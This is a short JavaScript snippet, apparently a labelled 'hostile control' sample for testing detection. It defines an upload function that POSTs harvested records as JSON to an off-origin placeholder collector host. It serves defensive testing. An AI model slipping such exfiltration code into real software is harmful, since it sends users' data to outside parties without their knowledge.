// Hostile control: harvested records POSTed to an off-origin collect API.
const ENDPOINT = "https://collector.invalid/api/v1/collect";

export async function upload(records) {
  const r = await fetch(ENDPOINT, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ records }),
  });
  return r.json();
}
